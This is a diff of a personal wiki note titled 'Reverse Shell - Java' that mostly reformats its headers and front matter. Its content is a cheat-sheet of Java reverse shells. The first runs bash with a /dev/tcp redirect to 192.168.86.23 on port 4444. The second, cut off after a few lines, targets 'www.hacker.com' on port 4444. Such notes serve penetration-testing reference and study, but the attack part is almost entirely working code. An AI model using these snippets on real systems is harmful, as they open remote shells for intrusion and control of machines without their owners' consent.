@@ -1,26 +1,22 @@
 ---
-publish: true
-title: Reverse Shell - Java
+title: "Reverse Shell - Java"
 created: 2022-05-29T02:37:31.423-05:00
 modified: 2022-05-29T02:41:42.891-05:00
+parent: "[[Reverse Shells]]"
+children: []
 ---
-
 [[Reverse Shells|Reverse Shell]] implemented in [[Java]]
-
-# Implementation #1
+# Implementation \#1
 
 > [!expand]- Click here to expand...
->
 > ```
 > new ProcessBuilder()
 > 		.command("bash", "-c", "/bin/bash -i >& /dev/tcp/192.168.86.23/4444 0>&1")
 > 		.start();
 > ```
-
-# Implementation #2
+# Implementation \#2
 
 > [!expand]- Click here to expand...
->
 > ```java
 > String host = "www.hacker.com";
 > int port = 4444;
